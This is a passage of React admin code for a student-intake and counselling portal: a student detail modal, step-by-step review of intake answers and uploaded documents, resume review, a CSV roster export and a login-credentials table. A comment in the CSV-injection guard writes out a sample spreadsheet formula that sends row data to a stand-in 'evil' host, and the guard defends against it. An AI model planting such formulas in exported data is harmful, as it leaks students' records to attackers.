            {/* Archive / unarchive / delete actions — shown once detail loads */}
            {detail && !detail.error && (
              <>
                {!detail.student?.is_archived && (
                  <button
                    onClick={doArchive}
                    disabled={actionBusy}
                    title="Archive this student (they won't be able to log in)"
                    className="inline-flex shrink-0 items-center gap-1 border border-stone-500 bg-white px-3 py-1.5 text-xs uppercase tracking-[0.15em] text-stone-700 transition hover:border-stone-700 hover:bg-stone-50 disabled:opacity-40"
                  >
                    <Archive className="h-3.5 w-3.5" /> Archive
                  </button>
                )}
                {detail.student?.is_archived && role === "admin" && (
                  <>
                    <button
                      onClick={doUnarchive}
                      disabled={actionBusy}
                      title="Restore this student"
                      className="inline-flex shrink-0 items-center gap-1 border border-emerald-600 bg-white px-3 py-1.5 text-xs uppercase tracking-[0.15em] text-emerald-700 transition hover:bg-emerald-50 disabled:opacity-40"
                    >
                      <ArchiveRestore className="h-3.5 w-3.5" /> Restore
                    </button>
                    <button
                      onClick={doDelete}
                      disabled={actionBusy}
                      title="Permanently delete all data for this student"
                      className="inline-flex shrink-0 items-center gap-1 border border-red-600 bg-white px-3 py-1.5 text-xs uppercase tracking-[0.15em] text-red-700 transition hover:bg-red-50 disabled:opacity-40"
                    >
                      <Trash2 className="h-3.5 w-3.5" /> Delete
                    </button>
                  </>
                )}
              </>
            )}
            <button
              onClick={onClose}
              title="Close (Esc)"
              className="inline-flex shrink-0 items-center gap-1 border border-stone-400 bg-white px-3 py-1.5 text-xs uppercase tracking-[0.15em] text-black transition hover:border-stone-700 hover:bg-stone-50"
            >
              <X className="h-4 w-4" /> Close
            </button>
          </div>
        </div>

        <div className="flex-1 overflow-y-auto px-4 py-4 sm:px-6 sm:py-6">
          {loading && (
            <p className="text-xs text-black">Loading…</p>
          )}
          {detail?.error && (
            <p className="text-xs text-red-700">{detail.error}</p>
          )}
          {detail && !detail.error && (
            <StudentDetail detail={detail} role={role} onRefresh={refreshDetail} />
          )}
        </div>

        {/* Student-view overlay — sits on top of the admin detail modal.
            Renders the full student panel (tabs + content) so admin can
            browse exactly what the student sees. Closes independently. */}
        {showStudentView && detail && !detail.error && (
          <div
            className="absolute inset-0 z-10 flex flex-col bg-[#f4f0e6]"
            style={{ overflowY: "auto" }}
          >
            <div className="sticky top-0 z-20 flex items-center justify-between border-b border-stone-300 bg-[#f4f0e6]/95 px-5 py-3 backdrop-blur">
              <p className="text-xs font-semibold uppercase tracking-[0.2em] text-[#cc785c]">
                Student view — {detail.student?.display_name || detail.student?.username || ""}
              </p>
              <button
                type="button"
                onClick={() => setShowStudentView(false)}
                className="inline-flex items-center gap-1 border border-stone-400 bg-white px-3 py-1.5 text-xs uppercase tracking-[0.15em] text-black transition hover:border-stone-700"
              >
                <X className="h-3.5 w-3.5" /> Close student view
              </button>
            </div>
            <div className="flex-1 px-4 py-4 sm:px-6">
              {studentPreviewData
                ? <AdminStudentView
                    studentId={studentId}
                    studentName={detail.student?.display_name || detail.student?.username || ""}
                    previewData={studentPreviewData}
                    answers={extractAnswers(detail.student?.data)}
                  />
                : <p className="text-xs text-black">Loading student panel…</p>
              }
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

// ============================================================
// StudentDetail — paginated read-only view of one student's data.
//
// Mirrors the student intake's prev/next flow so the admin can step
// horizontally through the same chapters/pages the student filled
// in, then through resumes / required-docs / uploaded files. One
// step on screen at a time keeps the row's expanded height roughly
// bounded to a laptop viewport instead of the prior wall of scroll.
// ============================================================
function StudentDetail({ detail, role, onRefresh }) {
  const { student, files, resumes } = detail;

  // Flat step sequence. Each chapter page becomes its own step (only
  // pages that have at least one answered field — `groupAnswersBySchema`
  // already filters those). Then the three always-on admin sections.
  const grouped = useMemo(() => {
    const answers = extractAnswers(student?.data);
    return groupAnswersBySchema(answers);
  }, [student?.data]);

  const fieldIndex = useMemo(() => buildFieldIndex(), []);

  // Slide builder helper: derive a human-readable document title from
  // the file's original_name. Strips the extension and trailing
  // duplicate-suffix patterns like " (1)" / " (1) (1)" so the slide
  // title reads as "1/4: UCMAS Certificate of Graduation" instead of
  // "1/4: UCMAS Certificate of Graduation (1) (1).pdf". Falls back to
  // "(unnamed file)" if original_name is empty.
  const docNameFor = useCallback((file) => {
    const raw = (file && file.original_name) || "";
    if (!raw) return "(unnamed file)";
    return raw
      .replace(/\.[A-Za-z0-9]{1,8}$/, "")
      .replace(/(\s*\(\d+\))+\s*$/g, "")
      .trim() || "(unnamed file)";
  }, []);

  // Field-id set the AI autofill pass populated. Persisted on
  // dispatch (server/routes/admin-ai.js) into student.data.autofilled_keys.
  // Used by ChapterSummaryBlock to badge each AI-written field with
  // an "AI autofilled" eyebrow.
  const autofilledKeys = useMemo(() => {
    const list = student?.data?.autofilled_keys;
    return Array.isArray(list) ? new Set(list) : null;
  }, [student?.data?.autofilled_keys]);

  // Each step is one focused slide. The flow is:
  //   1. For each chapter's pages, in schema order:
  //      a. Pages with NO uploaded files → a single "page" slide
  //         showing the form fields (typed answers).
  //      b. Pages with exactly one uploaded file → ONE combined slide
  //         showing the form fields, the document, and the AI analysis
  //         together (the typed context sits next to the scan).
  //      c. Pages with multiple uploaded files → a "review" summary
  //         slide showing the form fields once (file-slot rows hidden
  //         — the per-doc slides cover the files), then ONE "doc-only"
  //         slide per file (PDF + AI analysis only). Avoids
  //         re-rendering the whole activities list for every proof PDF.
  //      d. Pages with files but no typed answers (e.g. admin-recovered
  //         uploads whose answer slot wasn't updated) → "doc-only" slides
  //         so no empty form is shown alongside the document.
  //   2. Resumes step.
  const steps = useMemo(() => {
    const out = [];
    const allFiles = files || [];

    // Index the answer-enriched pages by id so we can look them up
    // while iterating the full schema.
    const groupedPageMap = new Map();
    grouped.forEach((chapter) => {
      chapter.pages.forEach((page) => {
        groupedPageMap.set(page.id, { chapterTitle: chapter.title, page });
      });
    });

    // Walk ALL chapters/pages in schema order. A page is included when:
    //   • the student answered at least one field on it (via groupedPageMap), OR
    //   • there is at least one active uploaded file whose field_id belongs
    //     to this page (catches admin-recovered files or any upload where the
    //     answer slot in data.answers wasn't updated).
    for (const chapter of CHAPTERS) {
      for (const schemaPage of chapter.pages) {
        const entry = groupedPageMap.get(schemaPage.id);
        // Use the answer-enriched page when available so field values render.
        const page = entry ? entry.page : schemaPage;
        // Always check files against the full schema fields (unfiltered by
        // isFieldVisible) so hidden/conditional file fields are still found.
        const pageFiles = filesForPage(schemaPage, allFiles);
        const hasAnswers = !!entry;

        if (!hasAnswers && pageFiles.length === 0) continue;

        if (pageFiles.length === 0) {
          // Answers only, no files.
          out.push({
            kind: "page",
            chapterTitle: chapter.title,
            page,
            eyebrow: chapter.title,
            title: page.title,
          });
        } else if (hasAnswers && pageFiles.length === 1) {
          // Answers + single file: combined slide.
          // Use page title, not filename — system-generated names are noisy.
          out.push({
            kind: "page-with-doc",
            chapterTitle: chapter.title,
            page,
            file: pageFiles[0],
            eyebrow: `${chapter.title} · ${page.title}`,
            title: page.title,
          });
        } else if (hasAnswers) {
          // Answers + multiple files: summary + per-doc slides.
          out.push({
            kind: "review",
            chapterTitle: chapter.title,
            page,
            fileCount: pageFiles.length,
            eyebrow: chapter.title,
            title: `${page.title} · summary`,
          });
          pageFiles.forEach((file, i) => {
            out.push({
              kind: "doc-only",
              chapterTitle: chapter.title,
              page,
              file,
              eyebrow: `${chapter.title} · ${page.title}`,
              title: `${i + 1}/${pageFiles.length}: ${docNameFor(file)}`,
            });
          });
        } else {
          // Files exist but no typed answers — show doc-only slides so the
          // admin sees the document without an empty/misleading form block.
          pageFiles.forEach((file, i) => {
            out.push({
              kind: "doc-only",
              chapterTitle: chapter.title,
              page,
              file,
              eyebrow: `${chapter.title} · ${page.title}`,
              title: pageFiles.length === 1 ? page.title : `${i + 1}/${pageFiles.length}: ${docNameFor(file)}`,
            });
          });
        }
      }
    }

    if (out.length === 0) {
      out.push({ kind: "empty", eyebrow: "Intake", title: "Form data" });
    }
    out.push({ kind: "resumes", eyebrow: "AI-generated resumes", title: `${resumes?.length || 0} on file` });
    out.push({ kind: "recommended-docs", eyebrow: "Required signed documents", title: "LOR · Internship · NGO · SOP" });
    // Section 19 — read-only lifecycle view (Uninitiated / In progress /
    // Signed) per slot. Mirrors what the student sees in their
    // "Document status" dashboard tab so the counsellor reviews the
    // exact same picture without bouncing between surfaces.
    out.push({ kind: "doc-status", eyebrow: "Document status", title: "Signed-copy lifecycle per slot" });
    return out;
  }, [grouped, resumes?.length, files, docNameFor]);

  const [stepIdx, setStepIdx] = useState(0);
  // Clamp if step list shrinks (e.g. resume row deleted).
  useEffect(() => {
    if (stepIdx > steps.length - 1) setStepIdx(Math.max(0, steps.length - 1));
  }, [steps.length, stepIdx]);

  const step = steps[stepIdx] || steps[0];
  const goPrev = () => setStepIdx((i) => Math.max(0, i - 1));
  const goNext = () => setStepIdx((i) => Math.min(steps.length - 1, i + 1));
  const atStart = stepIdx === 0;
  const atEnd = stepIdx === steps.length - 1;

  const phaseLabel = ({
    intake: "Filling intake form",
    generating: "Generating resume",
    done: "Intake complete",
  }[student?.intake_phase] || "Filling intake form");
  const phaseTone =
    student?.intake_phase === "done" ? "text-emerald-700"
    : student?.intake_phase === "generating" ? "text-amber-700"
    : "text-black";

  return (
    <div className="text-xs">
      {/* Sticky pagination bar — full-width progress strip on top so
          the reader sees position at a glance, then a prominent
          phase label on the left and big coloured prev/next buttons
          on the right. The orange (#cc785c) is the same brand accent
          used elsewhere in the app. */}
      <div className="sticky top-0 z-10 -mx-4 -mt-4 mb-6 border-b-2 border-stone-300 bg-white shadow-sm">
        <div className="h-1.5 w-full bg-stone-200">
          <div
            className="h-full bg-[#cc785c] transition-all duration-200"
            style={{ width: `${steps.length > 0 ? ((stepIdx + 1) / steps.length) * 100 : 0}%` }}
          />
        </div>
        <div className="flex flex-wrap items-center justify-between gap-3 px-5 py-4">
          <div className="flex items-baseline gap-3">
            <span className={`font-serif text-lg ${phaseTone}`}>{phaseLabel}</span>
            <span className="text-base text-stone-800">
              Step <span className="font-semibold text-black">{stepIdx + 1}</span> of <span className="font-semibold text-black">{steps.length}</span>
            </span>
          </div>
          <div className="flex items-center gap-2">
            <button
              type="button"
              onClick={goPrev}
              disabled={atStart}
              className="inline-flex items-center gap-2 border-2 border-stone-900 bg-white px-5 py-2.5 text-base font-semibold text-black transition hover:bg-stone-100 disabled:cursor-not-allowed disabled:opacity-30"
            >
              <ArrowLeft className="h-5 w-5" /> Prev
            </button>
            <button
              type="button"
              onClick={goNext}
              disabled={atEnd}
              className="inline-flex items-center gap-2 border-2 border-[#cc785c] bg-[#cc785c] px-5 py-2.5 text-base font-semibold text-white transition hover:bg-[#b86a4f] hover:border-[#b86a4f] disabled:cursor-not-allowed disabled:opacity-30"
            >
              Next <ArrowRight className="h-5 w-5" />
            </button>
          </div>
        </div>
      </div>

      <div className="mb-4">
        {step?.eyebrow && (
          <p className="text-xs font-semibold uppercase tracking-[0.2em] text-stone-600">
            {step.eyebrow}
          </p>
        )}
        <h2 className="mt-1.5 font-serif text-3xl leading-tight text-black">{step?.title}</h2>
      </div>

      {step?.kind === "page" && (
        <ChapterSummaryBlock
          chapter={{ id: step.page.id, title: step.chapterTitle, pages: [step.page] }}
          studentId={student.student_id}
          headless
          autofilledKeys={autofilledKeys}
        />
      )}
      {step?.kind === "page-with-doc" && (
        <div className="space-y-6">
          <ChapterSummaryBlock
            chapter={{ id: step.page.id, title: step.chapterTitle, pages: [step.page] }}
            studentId={student.student_id}
            headless
            hideFilePreviews
            autofilledKeys={autofilledKeys}
          />
          <ExtractionStep file={step.file} fieldIndex={fieldIndex} studentId={student.student_id} />
        </div>
      )}
      {step?.kind === "review" && (
        <div className="space-y-4">
          <ChapterSummaryBlock
            chapter={{ id: step.page.id, title: step.chapterTitle, pages: [step.page] }}
            studentId={student.student_id}
            headless
            hideFiles
            autofilledKeys={autofilledKeys}
          />
          <div className="border-2 border-[#cc785c] bg-[#fdf4ef] px-5 py-4 text-lg font-bold text-[#cc785c]">
            This is the summary. The next {step.fileCount} {step.fileCount === 1 ? "slide" : "slides"} show each document with its AI analysis.
          </div>
        </div>
      )}
      {step?.kind === "doc-only" && (
        <ExtractionStep file={step.file} fieldIndex={fieldIndex} studentId={student.student_id} />
      )}
      {step?.kind === "empty" && (
        <p className="border border-stone-200 bg-white px-4 py-3 text-black">
          Student hasn't started filling the form yet.
        </p>
      )}
      {step?.kind === "resumes" && (
        <ResumesStep
          resumes={resumes}
          student={student}
        />
      )}
      {step?.kind === "recommended-docs" && (
        <RecommendedDocsStep studentId={student.student_id} role={role} />
      )}
      {step?.kind === "doc-status" && (
        <DocStatusStep studentId={student.student_id} />
      )}
    </div>
  );
}

// ============================================================
// DocStatusStep — slide variant of the student-facing DocStatusBlock.
// Pulls the same required-doc rows for one student and renders the
// read-only "Uninitiated / In progress / Signed" lifecycle so the
// counsellor sees exactly what the student sees on their dashboard.
// ============================================================
function DocStatusStep({ studentId }) {
  const [docs, setDocs] = useState(null);
  const [err,  setErr]  = useState(null);

  useEffect(() => {
    let cancelled = false;
    api.listRequiredDocsForStudent(studentId)
      .then((list) => { if (!cancelled) setDocs(list); })
      .catch((e) => { if (!cancelled) setErr(e.message); });
    return () => { cancelled = true; };
  }, [studentId]);

  if (err) return <p className="text-sm text-red-700">{err}</p>;
  if (docs === null) {
    return <p className="inline-flex items-center gap-2 text-sm text-stone-700"><Loader2 className="h-4 w-4 animate-spin" /> Loading status…</p>;
  }

  return (
    <div>
      <p className="mb-4 text-sm text-stone-800">
        Read-only lifecycle for each LOR / Internship / NGO / Extracurricular / SOP slot — the same view the student sees under their "Document status" tab.
      </p>
      <DocStatusBlock docs={docs} />
    </div>
  );
}

// ============================================================
// RecommendedDocsStep — slide that lists every LOR / Internship / NGO
// / Extracurricular / SOP row for one student. Each row is a card
// with: slot label, current upload status, "Upload" / "Replace" button,
// and a click-through to the RecommendedDocPopup for preview + delete +
// admin Confirm. "+" buttons per kind add another slot. Matches the
// Documents-tab chip layout but as an inline form on the slide.
// ============================================================
function RecommendedDocsStep({ studentId, role }) {
  const [docs, setDocs] = useState(null);
  const [err,  setErr]  = useState(null);
  const [popup,setPopup]= useState(null);

  const refresh = useCallback(async () => {
    try {
      const list = await api.listRequiredDocsForStudent(studentId);
      setDocs(list);
      setPopup((prev) => {
        if (!prev) return null;
        const fresh = list.find((d) => String(d.id) === String(prev.id));
        return fresh || null;
      });
    } catch (e) {
      setErr(e.message);
    }
  }, [studentId]);

  useEffect(() => { refresh(); }, [refresh]);

  if (err) return <p className="text-sm text-red-700">{err}</p>;
  if (docs === null) return <p className="text-sm text-stone-700">Loading…</p>;

  const KINDS = [
    { kind: "lor",        label: "Letters of Recommendation" },
    { kind: "internship", label: "Internship certificates" },
    { kind: "ngo",        label: "NGO letters" },
    { kind: "extracurricular", label: "Extracurricular letters" },
    { kind: "sop",        label: "Statement of Purpose" },
  ];

  const addRow = async (kind) => {
    try {
      await api.createRequiredDocForStudent(studentId, { kind });
      await refresh();
    } catch (e) {
      window.alert(e.message || "Couldn't add row");
    }
  };

  return (
    <div className="space-y-8">
      <p className="text-sm text-stone-800">
        Upload a Word document for each slot — rather than a signed PDF or image.
        The student gets it printed on letterhead and signed, then uploads the stamped copy from their dashboard.
      </p>
      {KINDS.map((group) => {
        const rows = docs.filter((d) => d.kind === group.kind).sort((a, b) => a.seq - b.seq);
        if (rows.length === 0 && group.kind === "extracurricular") return null;
        return (
          <section key={group.kind}>
            <div className="mb-2 flex items-center justify-between">
              <h3 className="text-xs font-semibold uppercase tracking-[0.2em] text-stone-600">{group.label}</h3>
              <button
                type="button"
                onClick={() => addRow(group.kind)}
                className="inline-flex items-center gap-1 rounded border border-dashed border-stone-400 px-2.5 py-1 text-xs font-semibold text-stone-700 hover:border-[#cc785c] hover:text-[#cc785c]"
              >+ Add {group.kind === "sop" ? "SOP" : group.label.replace(/s$/, "")}</button>
            </div>
            <div className="grid grid-cols-1 gap-2 md:grid-cols-2">
              {rows.map((rd) => {
                const slotLabel = rd.kind === "sop" ? "SOP" : `${rd.kind.charAt(0).toUpperCase() + rd.kind.slice(1)} ${rd.seq}`;
                const hasFile = !!rd.final_file;
                const approved = !!rd.approved_by_admin_at;
                return (
                  <button
                    key={rd.id}
                    onClick={() => setPopup(rd)}
                    className={`rounded border px-4 py-3 text-left transition ${
                      approved ? "border-emerald-300 bg-emerald-50 hover:bg-emerald-100"
                      : hasFile ? "border-stone-300 bg-white hover:bg-stone-50"
                      : "border-dashed border-stone-300 bg-stone-50 hover:border-[#cc785c] hover:bg-white"
                    }`}
                  >
                    <div className="flex items-baseline justify-between gap-2">
                      <span className="text-sm font-semibold text-black">{slotLabel}</span>
                      <span className="text-[10px] uppercase tracking-[0.15em] text-stone-500">
                        {approved ? "Approved ✓" : hasFile ? "Uploaded" : "No file"}
                      </span>
                    </div>
                    {hasFile && (
                      <p className="mt-1 break-all text-xs text-stone-700">{rd.final_file.original_name}</p>
                    )}
                    {!hasFile && (
                      <p className="mt-1 text-xs text-stone-600">Click to upload a Word document.</p>
                    )}
                  </button>
                );
              })}
            </div>
          </section>
        );
      })}
      {popup && (
        <RecommendedDocPopup
          doc={popup}
          studentId={studentId}
          role={role}
          onClose={() => setPopup(null)}
          onRefresh={refresh}
        />
      )}
    </div>
  );
}

// ============================================================
// ResumesStep — read-only review surface for the staff slide flow.
// Renders the student's resume(s) using <ResumePdfPicker>, the same
// component the student sees on their dashboard, in compact mode so
// the three style buttons sit as a pill row above the live PDF
// preview. The header carries the word-count + status + stale signal
// so the reviewer can spot a freshly-edited intake against an old
// resume at a glance. Legacy markdown-only resumes fall through to
// <ResumeMarkdown> — those are pre-v2 rows that won't get a picker.
// ============================================================
function ResumesStep({ resumes, student }) {
  if (!resumes || resumes.length === 0) {
    return <p className="text-black">No resumes generated yet.</p>;
  }
  const studentName = student?.display_name || student?.username || "";
  return (
    <div className="space-y-3">
      {resumes.map((r) => {
        const snapshot = parseSnapshot(r.source_snapshot);
        // Stale = student data was edited AFTER the resume's last write.
        // Compare against r.updated_at (not r.created_at) because the
        // dispatch endpoint UPSERTs — one resume row per student means
        // re-runs advance updated_at but preserve created_at. Pre-fix,
        // every re-dispatch left the chip on because student.updated_at
        // was always slightly past the original resume.created_at even
        // though the resume row was just rewritten.
        const resumeRefTs = r.updated_at || r.created_at;
        const stale =
          r.status === "succeeded" &&
          student?.updated_at &&
          resumeRefTs &&
          new Date(student.updated_at).getTime() > new Date(resumeRefTs).getTime() + 5_000;
        return (
          <div key={r.id} className="border border-stone-200 bg-white">
            <header className="flex items-center justify-between gap-3 border-b border-stone-100 px-3 py-2">
              <span className="text-black">
                {r.label || `Resume #${r.id}`}
                {stale && (
                  <span
                    className="ml-2 rounded-sm bg-amber-100 px-1.5 py-0.5 text-[9px] font-semibold uppercase tracking-[0.15em] text-amber-800"
                    title={`Student edited their data after this resume was generated (${humanRelative(student.updated_at)} vs ${humanRelative(r.created_at)})`}
                  >
                    may be stale
                  </span>
                )}
              </span>
              <span className="text-[10px] uppercase tracking-[0.15em] text-black">
                {/* Prefer r.length_words (live column, set by every UPSERT
                    in /api/admin/ai/dispatch via countWordsInResumeJson).
                    source_snapshot can carry a stale actual_words from a
                    prior generator run — UPSERTs don't refresh it, so we
                    used to display the old number even after a fresh
                    re-dispatch. Fall back to snapshot only when there's
                    no length_words column populated. */}
                {r.length_words
                  ? `${r.length_words}w`
                  : snapshot?.actual_words
                    ? <span title={snapshot.length_warning || ""} className={snapshot.length_warning ? "text-amber-700" : ""}>
                        {snapshot.actual_words}w{snapshot.target_words ? ` / ${snapshot.target_words}w target` : ""}
                      </span>
                    : r.length_pages ? `${r.length_pages}p` : ""}
                {" · "}
                <span className={
                  r.status === "succeeded" ? "text-emerald-700"
                  : r.status === "failed" ? "text-red-700"
                  : "text-amber-700"
                }>{r.status}</span>
              </span>
            </header>
            {snapshot?.length_warning && (
              <p className="border-b border-stone-100 bg-amber-50 px-3 py-1.5 text-[10px] text-amber-800">
                ⚠ {snapshot.length_warning}
              </p>
            )}
            {r.content_json ? (
              <ResumePdfPicker payload={r.content_json} studentName={studentName} compact />
            ) : r.content_md ? (
              <div className="max-h-[600px] overflow-auto bg-white px-4 py-3">
                <ResumeMarkdown>{r.content_md}</ResumeMarkdown>
              </div>
            ) : r.error ? (
              <p className="px-3 py-2 text-[10px] text-red-700">{String(r.error).slice(0, 300)}</p>
            ) : (
              <p className="px-3 py-2 text-[10px] text-black">Generation in progress…</p>
            )}
          </div>
        );
      })}
    </div>
  );
}

// Best-effort decode of the source_snapshot column: server stringifies
// it on write but node-postgres may return it pre-parsed (jsonb) or
// as a string depending on driver settings. Handle both. Logging on
// failure (rather than swallowing) so a corrupt row doesn't silently
// hide the word-count + stale signals from staff.
function parseSnapshot(s) {
  if (!s) return null;
  if (typeof s === "object") return s;
  try { return JSON.parse(s); } catch (e) {
    console.warn("[StudentsAdmin] source_snapshot parse failed:", e?.message);
    return null;
  }
}

// Activity label per row. The list endpoint's `updated_at` is set
// even on row-creation, so a brand-new student would otherwise read
// as "last active just now" before they've ever logged in. Detect
// the never-touched case (no answers in data) and surface the row's
// creation time instead.
function activityLabel(row) {
  const answers = row?.data?.answers;
  const hasAnyActivity = answers && typeof answers === "object" && Object.keys(answers).length > 0;
  if (!hasAnyActivity) return `Created ${humanRelative(row.created_at || row.updated_at)}`;
  return `Last active ${humanRelative(row.updated_at)}`;
}

// "5m ago" / "3h ago" / "2d ago". Compact enough to fit on a row
// without breaking the layout. Falls back to "—" for missing input
// and clamps clock-skew futures to "just now" instead of "-5m ago".
function humanRelative(iso) {
  if (!iso) return "—";
  const ms = Date.now() - new Date(iso).getTime();
  if (Number.isNaN(ms)) return "—";
  if (ms < 60_000) return "just now";
  const min = Math.round(ms / 60_000);
  if (min < 60) return `${min}m ago`;
  const hr = Math.round(min / 60);
  if (hr < 24) return `${hr}h ago`;
  const d = Math.round(hr / 24);
  if (d < 30) return `${d}d ago`;
  const mo = Math.round(d / 30);
  if (mo < 12) return `${mo}mo ago`;
  return `${Math.round(mo / 12)}y ago`;
}

// ============================================================
// AdminStudentView — renders the student's PanelTabs layout using
// admin-fetched data. Matches the tab structure the student sees:
//   Overview · Your documents · Recommended documents · Your resume
//   Application status · Profile documents · Resume & extras · Your story
// All data comes from the admin's detail endpoint — no student-session
// API calls. Form chapter tabs are read-only (no saves).
// ============================================================
function AdminStudentView({ studentId, studentName, previewData, answers }) {
  const tabs = [
    { id: "overview",      label: "Overview" },
    { id: "documents",     label: "Your documents" },
    { id: "financial",     label: "Financial documents" },
    { id: "required-docs", label: "Required signed documents" },
    { id: "resume",        label: "Your resume" },
    { id: "status",        label: "Application status" },
    ...PANEL_CHAPTERS.filter((c) => c.id !== "destination").map((c) => ({ id: c.id, label: c.title })),
  ];

  const [activeTab, setActiveTab] = useState("overview");

  const dashboardSection = {
    overview: "summary",
    documents: "documents",
    "required-docs": "required-docs",
    resume: "resume",
  }[activeTab] || null;

  const activeChapter = PANEL_CHAPTERS.find((c) => c.id === activeTab) || null;
  const grouped = useMemo(() => groupAnswersBySchema(answers || {}), [answers]);

  return (
    <div className="font-serif text-black">
      {/* Tab nav */}
      <nav className="mb-6 flex flex-wrap items-center gap-2">
        {tabs.map((t) => {
          const isActive = t.id === activeTab;
          return (
            <button
              key={t.id}
              type="button"
              onClick={() => setActiveTab(t.id)}
              className={`whitespace-nowrap border px-4 py-2 text-sm transition ${
                isActive
                  ? "border-[#cc785c] bg-[#cc785c] text-white"
                  : "border-stone-300 bg-white text-black hover:border-stone-900"
              }`}
            >
              {t.label}
            </button>
          );
        })}
      </nav>

      {/* Data tabs — use StudentDashboard with admin preview data */}
      {dashboardSection && (
        <StudentDashboard
          key={dashboardSection}
          studentName={studentName}
          embedded
          section={dashboardSection}
          adminStudentId={studentId}
          adminPreviewData={previewData}
        />
      )}

      {/* Financial documents — uses existing staff read-only mode */}
      {activeTab === "financial" && (
        <FinancialDocuments studentId={studentId} />
      )}

      {/* Application status */}
      {activeTab === "status" && (
        <div className="space-y-3">
          <p className="text-[10px] font-semibold uppercase tracking-[0.2em] text-black">Application status</p>
          {(previewData.applications || []).length === 0 ? (
            <p className="border border-stone-200 bg-white px-4 py-3 text-sm text-stone-800">No applications on file.</p>
          ) : (
            (previewData.applications || []).map((app) => (
              <div key={app.id} className="border border-stone-200 bg-white px-4 py-3">
                <p className="font-medium text-black">{app.university}</p>
                <p className="mt-0.5 text-sm text-stone-800">
                  {app.program && <span>{app.program} · </span>}
                  {app.country && <span>{app.country} · </span>}
                  <span className="uppercase tracking-[0.1em]">{app.status || "pending"}</span>
                  {app.deadline && <span> · due {app.deadline}</span>}
                </p>
              </div>
            ))
          )}
        </div>
      )}

      {/* Panel chapter tabs — read-only summary of the student's form answers */}
      {activeChapter && (
        <div>
          <p className="mb-4 text-[10px] uppercase tracking-[0.3em] text-black">▸ {activeChapter.title}</p>
          <div className="space-y-5">
            {activeChapter.pages.map((page) => {
              const chapterGroup = grouped.find((g) => g.id === activeChapter.id);
              const pageGroup = chapterGroup?.pages?.find((p) => p.id === page.id);
              return pageGroup ? (
                <ChapterSummaryBlock
                  key={page.id}
                  chapter={{ id: activeChapter.id, title: activeChapter.title, pages: [pageGroup] }}
                  studentId={studentId}
                  headless
                />
              ) : (
                <div key={page.id} className="border border-dashed border-stone-200 px-4 py-3 text-sm text-stone-800">
                  {page.title} — not filled in yet.
                </div>
              );
            })}
          </div>
        </div>
      )}
    </div>
  );
}

// CSV download for the visible roster rows. Common parent-meeting prep
// path. Uses RFC 4180 quoting (wrap fields in "..", escape any embedded
// double-quote by doubling it). Date stamps the filename so a counsellor
// downloading twice doesn't overwrite the first export.
function downloadStudentsCsv(rows) {
  if (!rows || rows.length === 0) return;
  const cols = [
    "student_id",
    "username",
    "display_name",
    "intake_complete",
    "file_count",
    "resume_count",
    "lead_name",
    "counsellor_name",
    "created_at",
    "updated_at",
  ];
  // CSV-injection guard. Excel / LibreOffice / Numbers all evaluate any
  // cell starting with =, +, -, @, tab, or carriage return as a formula
  // — which means a student-controlled display_name like
  //   =HYPERLINK("https://evil/?c="&A1, "click")
  // exfiltrates the row when a counsellor opens the export. Prefix
  // those with a single quote (the Excel convention to force literal-
  // text). Then standard RFC 4180 quoting on top.
  const FORMULA_LEAD = /^[=+\-@\t\r]/;
  const esc = (v) => {
    if (v == null) return "";
    let s = String(v);
    if (FORMULA_LEAD.test(s)) s = "'" + s;
    return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
  };
  const lines = [cols.join(",")];
  for (const r of rows) {
    lines.push(cols.map((c) => esc(r[c])).join(","));
  }
  const blob = new Blob([lines.join("\n")], { type: "text/csv;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  const stamp = new Date().toISOString().slice(0, 10);
  a.download = `persona-students-${stamp}.csv`;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

// ============================================================
// StudentSubTab — secondary tab bar inside the Students section.
// Styled smaller than the parent FolderTab to signal hierarchy.
// ============================================================
function StudentSubTab({ label, active, onClick }) {
  if (active) {
    return (
      <button
        onClick={onClick}
        className="relative z-10 -mb-px border border-stone-300 border-b-transparent bg-[#faf9f5] px-4 py-1 text-[10px] font-semibold uppercase tracking-[0.2em] text-black"
      >
        {label}
      </button>
    );
  }
  return (
    <button
      onClick={onClick}
      className="border border-stone-200 bg-stone-50 px-4 py-1 text-[10px] uppercase tracking-[0.2em] text-stone-500 hover:bg-stone-100 hover:text-black"
    >
      {label}
    </button>
  );
}

// ============================================================
// StudentCommsTab — table of every active student's login username,
// visible to admins and counsellors (counsellors see their own students
// only, scoped server-side). Passwords are hashed and unrecoverable;
// the Reset button issues a new one-time password via CredentialsModal.
// ============================================================
function StudentCommsTab({ students, loading, onResetPassword }) {
  const [resetting, setResetting] = useState(null);
  const [resetErr, setResetErr] = useState(null);

  const handleReset = async (student) => {
    setResetting(student.student_id);
    setResetErr(null);
    try {
      const account = await api.resetStudentPassword(student.student_id);
      onResetPassword({ ...account, display_name: student.display_name });
    } catch (e) {
      setResetErr(e.message);
    } finally {
      setResetting(null);
    }
  };

  if (loading) {
    return (
      <div className="flex items-center gap-2 py-10 text-sm text-stone-600">
        <Loader2 className="h-4 w-4 animate-spin" /> Loading…
      </div>
    );
  }

  return (
    <div>
      <p className="mb-4 text-sm text-stone-800">
        Login credentials for every active student. Passwords are hashed and cannot be retrieved — use Reset to issue a new one-time password.
      </p>
      {resetErr && (
        <p className="mb-3 inline-flex items-center gap-2 text-xs text-red-700">
          <AlertCircle className="h-3 w-3" /> {resetErr}
        </p>
      )}
      {students.length === 0 ? (
        <p className="text-sm text-stone-600">No students yet.</p>
      ) : (
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-stone-300 text-left text-[10px] uppercase tracking-[0.2em] text-stone-600">
                <th className="pb-2 pr-8 font-normal">Name</th>
                <th className="pb-2 pr-8 font-normal">Username (login ID)</th>
                <th className="pb-2 pr-8 font-normal">Counsellor</th>
                <th className="pb-2 pr-8 font-normal">Created</th>
                <th className="pb-2 font-normal">Password</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-stone-100">
              {students.map((s) => (
                <tr key={s.student_id}>
                  <td className="py-2.5 pr-8 font-medium text-black">
                    {s.display_name || s.username}
                  </td>
                  <td className="py-2.5 pr-8 font-mono text-xs text-stone-700">
                    {s.username}
                  </td>
                  <td className="py-2.5 pr-8 text-stone-700">
                    {s.counsellor_name || "—"}
                  </td>
                  <td className="py-2.5 pr-8 tabular-nums text-stone-700">
                    {s.created_at ? new Date(s.created_at).toLocaleDateString() : "—"}
